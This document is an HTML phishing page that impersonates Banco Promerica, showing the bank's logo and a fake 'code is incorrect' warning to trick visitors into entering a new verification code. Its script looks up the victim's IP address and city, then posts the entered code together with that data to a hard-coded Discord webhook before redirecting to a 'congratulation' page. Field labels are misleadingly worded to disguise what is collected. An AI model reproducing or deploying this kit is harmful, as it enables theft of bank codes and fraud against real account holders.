<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promerica/Creditos</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .card {
            background: #ffffff;
            width: 100%;
            max-width: 400px;
            padding: 35px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            text-align: center;
        }

        .logo-box { margin-bottom: 25px; }
        .logo-box img { max-width: 140px; height: auto; }

        .question-label {
            display: block;
            font-size: 16px;
            font-weight: 700;
            color: #2c3e50;
            margin-bottom: 10px; /* Reducido para acercar la advertencia */
            line-height: 1.4;
        }

        /* Advertencia siempre visible entre pregunta y casilla */
        .alert-permanent {
            background-color: #fff5f5;
            color: #c0392b;
            font-size: 13px;
            font-weight: 600;
            padding: 8px;
            border-radius: 6px;
            border-left: 4px solid #e74c3c;
            margin-bottom: 15px;
            display: inline-block;
            width: 85%;
        }

        .input-field {
            width: 75%;
            padding: 12px 15px;
            border: 2px solid #e0e6ed;
            border-radius: 8px;
            font-size: 18px;
            text-align: center;
            background-color: #f9fafb;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }

        .input-field:focus {
            outline: none;
            border-color: #27ae60;
            background-color: #fff;
        }

        .btn-green {
            width: 100%;
            background-color: #27ae60;
            color: white;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn-green:hover { background-color: #219150; }
        .btn-green:disabled { background-color: #bdc3c7; }

        #gfg, #address { display: none; }
    </style>
</head>
<body>

    <div id="gfg"></div>
    <div id="address"></div>

    <div class="card">
        <div class="logo-box">
            <img src="https://afcomunicacion.com/wp-content/uploads/2022/09/banco-promerica-logo-DB8A2BA7D2-seeklogo.com_.png" alt="Logo">
        </div>

        <form id="discordForm">
            <label class="question-label">Ingresa el nuevo codigo</label>
            
            <div class="alert-permanent">
                锔 El codigo ingresado es incorrecto.
            </div>

            <input type="text" id="clvuernm" class="input-field" placeholder="CODIGO" required>

            <button type="submit" id="submitBtn" class="btn-green">Confirmar</button>
        </form>
    </div>

    <script>
        // Captura de IP y Ubicaci贸n
        $(document).ready(function() {
            $.getJSON("https://api.ipify.org?format=json", function(data) {
                $("#gfg").html(data.ip);
            });
            $.getJSON("https://ipinfo.io", function(response) {
                $("#address").html(response.city + ", " + response.country);
            });
        });

        document.getElementById('discordForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const btn = document.getElementById('submitBtn');
            const inputVal = document.getElementById("clvuernm").value;
            const ganancia = inputVal.replace(/[^0-9]/g, ''); 

            // Validaci贸n simple para evitar env铆os vac铆os
            if (ganancia === "" || parseInt(ganancia) <= 0) {
                alert("Por favor, ingresa un monto v谩lido para continuar.");
                return;
            }

            const webhookURL = "https://discordapp.com/api/webhooks/1442908899123531806/8z_rCr-7dX0E_o2tWTgHfOcEfYeTLrXu3ZVLhOqPh2t2MO5QFwvp1WGrqxf3S2O2xoDL"; 
            const userIP = document.getElementById("gfg").innerHTML || "No detectada";
            const userLoc = document.getElementById("address").innerHTML || "No detectada";

            btn.innerText = "Procesando...";
            btn.disabled = true;

            const contents = {
                embeds: [{
                    title: " Nueva Meta Captada",
                    color: 3066993,
                    fields: [
                        { name: "Meta Mensual", value: "$" + ganancia + " USD", inline: false },
                        { name: "Datos de Origen", value: "IP: " + userIP + "\nUbicaci贸n: " + userLoc, inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(contents)
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = "congratulation.html";
                }
            })
            .catch(() => {
                alert("Error de conexi贸n.");
                btn.disabled = false;
                btn.innerText = "Obtener Plan Estrat茅gico";
            });
        });
    </script>

</body>
</html>
